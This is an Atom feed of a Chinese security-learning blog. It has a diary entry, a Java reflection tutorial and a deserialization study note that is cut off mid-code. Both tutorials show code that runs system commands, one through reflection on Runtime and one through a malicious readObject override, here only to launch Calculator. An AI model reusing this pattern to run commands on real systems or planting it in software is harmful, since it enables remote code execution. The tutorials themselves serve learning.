<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Patrilic&#39;s blog</title>
  
  <subtitle>不忘初心</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://patrilic.top/"/>
  <updated>2020-01-05T13:56:43.363Z</updated>
  <id>http://patrilic.top/</id>
  
  <author>
    <name>Patrilic</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Tomorrow</title>
    <link href="http://patrilic.top/2099/12/31/Tomorrow/"/>
    <id>http://patrilic.top/2099/12/31/Tomorrow/</id>
    <published>2099-12-30T16:00:00.000Z</published>
    <updated>2020-01-05T13:56:43.363Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/wallpaper/thumb-1920-485164.jpg" alt></p><h5 id="写给自己"><a href="#写给自己" class="headerlink" title="写给自己"></a>写给自己</h5><hr><blockquote><p>Tomorrow is not just another day in your life<br>It’s the next day in an ‘it does matter’ life</p></blockquote><hr><p>其实呢，一直想把博客变成一个只属于自己的小块空间，自己想怎么装饰就怎么装饰，想写什么就写什么，甚至之前有段时间只用<code>hexo s</code>233333</p><p>现在觉得呢，还是一样，不用在意别人的眼光，自己做干什么就做什么，慢慢把自己想好好写的东西放在博客上，等以后年纪上去了，也算是有个纪念～</p><p>以后这里我打算写一点自己从生活中经历的事情得到的感悟或者一些有趣的事情吧，本身也不是想搞成纯技术博客的 😁</p><blockquote><pre><code>-- 2019.8.28 早 3点56分</code></pre></blockquote><h5 id="2019-8-28"><a href="#2019-8-28" class="headerlink" title="2019.8.28"></a>2019.8.28</h5><p>还有几天就要正式进入大三的生活了，课还行，主要是感觉可能这辈子的学生生涯也快到头了..</p><p>最近经历很多事情，也看开了，好好学习，好好生活。</p><p>劝诸君： 身体健康才是第一位 ，哎 共勉吧</p><p>明天加油</p><blockquote><p>Just fxxking do it dig fucking deep and get it done</p></blockquote><h5 id="2019-8-30"><a href="#2019-8-30" class="headerlink" title="2019.8.30"></a>2019.8.30</h5><p>好像今天要开学了，早点休息吧～</p><blockquote><p>Get raw and get intense</p></blockquote><h5 id="2019-9-9"><a href="#2019-9-9" class="headerlink" title="2019.9.9"></a>2019.9.9</h5><p>差距啊..太菜了，还有什么理由不努力的吗？</p><blockquote><p>微光</p></blockquote><h5 id="2019-9-15"><a href="#2019-9-15" class="headerlink" title="2019.9.15"></a>2019.9.15</h5><blockquote><p>一切有为法 如梦幻泡影<br>如露亦如电 应作如是观</p></blockquote><h5 id="2020-1-5"><a href="#2020-1-5" class="headerlink" title="2020.1.5"></a>2020.1.5</h5><p>UNC路径不能访问外网服务器的原因: 经过路由不一定都开放135,137,139,445</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/wallpaper/thumb-1920-485164.jpg&quot; alt&gt;&lt;/p&gt;
&lt;h5 id=&quot;写给自己&quot;&gt;&lt;a href=&quot;#写给自己&quot; class=&quot;headerlink&quot; title=&quot;写给自己&quot;&gt;&lt;/a&gt;写给自己&lt;/h5&gt;&lt;hr&gt;
&lt;blo
      
    
    </summary>
    
      <category term="Diary" scheme="http://patrilic.top/categories/Diary/"/>
    
    
  </entry>
  
  <entry>
    <title>Java Refection</title>
    <link href="http://patrilic.top/2020/03/18/Java%20Reflection/"/>
    <id>http://patrilic.top/2020/03/18/Java Reflection/</id>
    <published>2020-03-18T09:43:11.000Z</published>
    <updated>2020-03-18T09:43:39.737Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2020-3-18 17:43:11</p></blockquote><p><img src="/wallpaper/girl_silhouette.jpg" alt></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>反射是Java的一个高级特性，指在<code>运行状态中</code>对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性，创建实例，修改类成员变量等等。 这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制。</p><h2 id="0x01-相关类"><a href="#0x01-相关类" class="headerlink" title="0x01 相关类"></a>0x01 相关类</h2><table><thead><tr><th>类名</th><th>用途</th></tr></thead><tbody><tr><td>Class类</td><td>类的实体，在运行的Java应用程序中表示类和接口</td></tr><tr><td>Method类</td><td>类的方法</td></tr><tr><td>Construct类</td><td>类的构造方法</td></tr><tr><td>Field类</td><td>类的成员变量</td></tr></tbody></table><h3 id="Get-Class"><a href="#Get-Class" class="headerlink" title="Get Class"></a>Get Class</h3><p>获取类的方式通常有三种<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class  runtimeClass1 = Class.forName(className);</span><br><span class="line">Class  runtimeClass2 = java.lang.Runtime.class;</span><br><span class="line">Class  runtimeClass3 = ClassLoader.getSystemClassLoader().loadClass(className);</span><br></pre></td></tr></table></figure></p><p>需要注意的是，在获取数组类型的Class对象时，需要使用特殊的Java描述符<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; doubleArray = Class.forName(<span class="string">"[D"</span>);</span><br><span class="line">Class&lt;?&gt; cStringArray = Class.forName(<span class="string">"[[Ljava.lang.String;"</span>);</span><br></pre></td></tr></table></figure></p><h3 id="Get-Construct"><a href="#Get-Construct" class="headerlink" title="Get Construct"></a>Get Construct</h3><p>首先跳到<code>java.lang.Runtime</code>的源码处，可以观察到Runtime类的构造方法是private属性的，也就是说不允许其他人创建实例。<br><img src="/Java Reflection.resources/D1AB073F-6FFC-46E6-98C6-AB307372ED9E.png" alt="e488ae699f0ee7f64c5842bfbd585adb"></p><p>也就是说，在没有<code>import java.lang.Runtime</code>的时候，我们是不能够去new一个新的Runtime对象的</p><p>反射机制提供了两种方法可以获取类的构造方法： </p><ul><li>runtimeClass1.getDeclaredConstructor </li><li>runtimeClass1.getConstructor // 不能获取private方法</li></ul><p>获取Constuct后，使用<code>constructor.newInstance()</code>实例化</p><p>当我们没有访问构造方法权限时我们应该调用constructor.setAccessible(true)修改访问权限就可以成功的创建出类实例了</p><h3 id="Get-Method"><a href="#Get-Method" class="headerlink" title="Get Method"></a>Get Method</h3><p>获取当前类所有的成员方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method[] methods = runtimeClass1.getDeclaredMethods();</span><br></pre></td></tr></table></figure></p><p>获取当前类指定的成员方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method method = clazz.getDeclaredMethod(<span class="string">"方法名"</span>);</span><br></pre></td></tr></table></figure></p><p>通过method.invoke可以调用方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">method.invoke(方法实例对象, 方法参数值，多个参数值用<span class="string">","</span>隔开);</span><br></pre></td></tr></table></figure></p><p>method.invoke的第一个参数必须是类实例对象，如果调用的是static方法那么第一个参数值可以传null，因为在java中调用静态方法是不需要有类实例的，因为可以直接类名.方法名(参数)的方式调用</p><h3 id="Get-Field"><a href="#Get-Field" class="headerlink" title="Get Field"></a>Get Field</h3><p>获取当前类的所有成员变量：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Field fields = clazz.getDeclaredFields();</span><br></pre></td></tr></table></figure></p><p>获取当前类指定的成员变量：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Field field  = clazz.getDeclaredField(<span class="string">"变量名"</span>);</span><br></pre></td></tr></table></figure></p><p>获取当前类的所有成员变量：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Field fields = clazz.getDeclaredFields();</span><br></pre></td></tr></table></figure></p><p>获取当前类指定的成员变量：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Field field  = clazz.getDeclaredField(<span class="string">"变量名"</span>);</span><br></pre></td></tr></table></figure></p><p>当我们没有修改的成员变量权限时可以使用: field.setAccessible(true)的方式修改为访问成员变量访问权限</p><p>修改final关键字修饰的变量时：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 反射获取Field类的modifiers</span></span><br><span class="line">Field modifiers = field.getClass().getDeclaredField(<span class="string">"modifiers"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置modifiers修改权限</span></span><br><span class="line">modifiers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改成员变量的Field对象的modifiers值</span></span><br><span class="line">modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改成员变量值</span></span><br><span class="line">field.set(类实例对象, 修改后的值);</span><br></pre></td></tr></table></figure></p><h2 id="0x02-反射java-lang-Runtime"><a href="#0x02-反射java-lang-Runtime" class="headerlink" title="0x02 反射java.lang.Runtime"></a>0x02 反射java.lang.Runtime</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.reflect;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeClass</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, SecurityException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException </span>&#123;</span><br><span class="line">String className     = <span class="string">"java.lang.Runtime"</span>;</span><br><span class="line">Class  runtimeClass1 = Class.forName(className);</span><br><span class="line">Class  runtimeClass2 = java.lang.Runtime.class;</span><br><span class="line">Class  runtimeClass3 = ClassLoader.getSystemClassLoader().loadClass(className);</span><br><span class="line"></span><br><span class="line">System.out.println(runtimeClass1);</span><br><span class="line">System.out.println(runtimeClass2);</span><br><span class="line">System.out.println(runtimeClass3);</span><br><span class="line"></span><br><span class="line">Constructor constructor = runtimeClass1.getDeclaredConstructor();</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span></span><br><span class="line">Object runtimeInstance = constructor.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Method runtimeMethod = runtimeClass1.getMethod(<span class="string">"exec"</span>, String.class);</span><br><span class="line">Process process = (Process) runtimeMethod.invoke(runtimeInstance, <span class="string">"open -a /System/Applications/Calculator.app"</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">System.out.println(e);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Java Reflection.resources/9777955F-F737-4684-A531-6EF91AA1936E.png" alt="c1abfa931867d7ce0f429414ec7f27e0"></p><h2 id="0x03-相关链接"><a href="#0x03-相关链接" class="headerlink" title="0x03 相关链接"></a>0x03 相关链接</h2><p><a href="https://javasec.org/javase/Reflection/Reflection.html" target="_blank" rel="noopener">https://javasec.org/javase/Reflection/Reflection.html</a><br><a href="https://www.jianshu.com/p/9be58ee20dee" target="_blank" rel="noopener">https://www.jianshu.com/p/9be58ee20dee</a><br><a href="https://xz.aliyun.com/t/2342" target="_blank" rel="noopener">https://xz.aliyun.com/t/2342</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2020-3-18 17:43:11&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;/wallpaper/girl_silhouette.jpg&quot; alt&gt;&lt;/p&gt;
&lt;h2 i
      
    
    </summary>
    
      <category term="Java_Sec" scheme="http://patrilic.top/categories/Java-Sec/"/>
    
    
      <category term="Java反射" scheme="http://patrilic.top/tags/Java%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化学习</title>
    <link href="http://patrilic.top/2020/03/18/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://patrilic.top/2020/03/18/Java 反序列化/</id>
    <published>2020-03-18T03:26:55.000Z</published>
    <updated>2020-03-18T03:28:17.371Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2020-3-18 11:26:55</p></blockquote><p><img src="/wallpaper/girl_field_night.jpg" alt></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Java中只需要实现<code>java.io.Serializable</code>或者<code>java.io.Externalizable</code>接口即可执行序列化操作</p><h2 id="0x01-构造序列化-反序列化操作"><a href="#0x01-构造序列化-反序列化操作" class="headerlink" title="0x01 构造序列化/反序列化操作"></a>0x01 构造序列化/反序列化操作</h2><p>构造一个调用类，其中，Exployee类实现了<code>java.io.Serializable</code>接口 ：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.testSer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> String name;</span><br><span class="line">   <span class="keyword">public</span> String identify;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mailCheck</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      System.out.println(<span class="string">"This is the "</span>+<span class="keyword">this</span>.identify+<span class="string">" of our company"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>序列化操作, 在调用Employee类时，所有的数据都会被序列化<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.testSer;</span><br><span class="line"><span class="keyword">import</span> com.patrilic.testSer.Employee;</span><br><span class="line"></span><br><span class="line"><span class="comment">//import com.sun.xml.internal.bind.v2.runtime.unmarshaller.XsiNilLoader.Array;</span></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Step1</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span> </span>&#123;</span><br><span class="line">      Employee e = <span class="keyword">new</span> Employee();</span><br><span class="line">      e.name = <span class="string">"员工甲"</span>;</span><br><span class="line">      e.identify = <span class="string">"General staff"</span>;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 打开一个文件输入流</span></span><br><span class="line">         FileOutputStream fileOut =</span><br><span class="line">         <span class="keyword">new</span> FileOutputStream(<span class="string">"/tmp/test.db"</span>);</span><br><span class="line">         <span class="comment">// 建立对象输入流</span></span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(fileOut);</span><br><span class="line">         <span class="comment">//输出反序列化对象</span></span><br><span class="line">         out.writeObject(e);</span><br><span class="line">         out.close();</span><br><span class="line">         fileOut.close();</span><br><span class="line">         System.out.printf(<span class="string">"Serialized data is saved in /tmp/test.db"</span>);</span><br><span class="line">      &#125;<span class="keyword">catch</span>(IOException i)</span><br><span class="line">      &#123;</span><br><span class="line">          i.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>反序列化操作<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.testSer;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Step2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">  </span><br><span class="line">      Employee e = <span class="keyword">null</span>;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 打开一个文件输入流</span></span><br><span class="line">         FileInputStream fileIn = <span class="keyword">new</span> FileInputStream(<span class="string">"/tmp/test.db"</span>);</span><br><span class="line">        <span class="comment">// 建立对象输入流</span></span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(fileIn);</span><br><span class="line">        <span class="comment">// 读取对象</span></span><br><span class="line">         e = (Employee) in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line">         fileIn.close();</span><br><span class="line">      &#125;<span class="keyword">catch</span>(IOException i)</span><br><span class="line">      &#123;</span><br><span class="line">         i.printStackTrace();</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">      &#125;<span class="keyword">catch</span>(ClassNotFoundException c)</span><br><span class="line">      &#123;</span><br><span class="line">         System.out.println(<span class="string">"Employee class not found"</span>);</span><br><span class="line">         c.printStackTrace();</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      System.out.println(<span class="string">"Deserialized Employee..."</span>);</span><br><span class="line">      System.out.println(<span class="string">"Name: "</span> + e.name);</span><br><span class="line">      System.out.println(<span class="string">"This is the "</span>+e.identify+<span class="string">" of our company"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/Java 反序列化.resources/13259480-88F4-4BA5-A0FA-757AC0180B25.png" alt="5c76564b213c37611a5e44668313a8bd"></p><h2 id="0x02-反序列化漏洞"><a href="#0x02-反序列化漏洞" class="headerlink" title="0x02 反序列化漏洞"></a>0x02 反序列化漏洞</h2><p>Java反序列化中，会调用被反序列化的readObject方法，如果readObject方法是恶意的，那么就会引发漏洞</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.testSer;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        UnsafeClass Unsafe = <span class="keyword">new</span> UnsafeClass();</span><br><span class="line">        Unsafe.name = <span class="string">"hacked by ph0rse"</span>;</span><br><span class="line"></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"object"</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        <span class="comment">//writeObject()方法将Unsafe对象写入object文件</span></span><br><span class="line">        os.writeObject(Unsafe);</span><br><span class="line">        os.close();</span><br><span class="line">        <span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"object"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        <span class="comment">//恢复对象</span></span><br><span class="line">        UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UnsafeClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//重写readObject()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//执行命令</span></span><br><span class="line">        System.out.println(<span class="string">"my First!"</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"open -a Calculator.app"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里进行反序列化操作时，使用<code>ObjectInputStream</code>读取序列化文件，然后调用了<code>readObject()</code>, 当然就会成功的执行命令<br><img src="/Java 反序列化.resources/4AE8E45C-404B-4C71-B7E4-3F34724B622B.png" alt="91feac2fe936fc44a74b4558c29b5774"></p><p>并且确实是先执行了readObject类的操作，然后再进行<code>System.out.println(name)</code></p><h3 id="ObjectInputStream-amp-amp-ObjectOutputStream"><a href="#ObjectInputStream-amp-amp-ObjectOutputStream" class="headerlink" title="ObjectInputStream &amp;&amp; ObjectOutputStream"></a>ObjectInputStream &amp;&amp; ObjectOutputStream</h3><p>序列化对象: <code>java.io.ObjectOutputStream</code>-&gt;<code>writeObject()</code></p><p>反序列化对象: <code>java.io.ObjectInputStream</code>-&gt;<code>readObject()</code></p><p>也就是说在序列化类时，就会自动去</p><h4 id="Serializable"><a href="#Serializable" class="headerlink" title="Serializable"></a>Serializable</h4><p><img src="/Java 反序列化.resources/5D3785F2-BB16-410A-B71D-C528BBABD3A6.png" alt="353fe18d91d94771da7b2851b01803c5"></p><p>java.io.Serializable接口是空接口，仅仅用于表示这个类可序列化<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.demo;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DeserializationTest</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> username;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.username = username;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getEmail</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> email;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEmail</span><span class="params">(String email)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.email = email;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建DeserializationTest类，并类设置属性值</span></span><br><span class="line">            DeserializationTest t = <span class="keyword">new</span> DeserializationTest();</span><br><span class="line">            t.setUsername(<span class="string">"Patrilic"</span>);</span><br><span class="line">            t.setEmail(<span class="string">"admin@patrilic.top"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建Java对象序列化输出流对象</span></span><br><span class="line">            ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 序列化DeserializationTest类</span></span><br><span class="line">            out.writeObject(t);</span><br><span 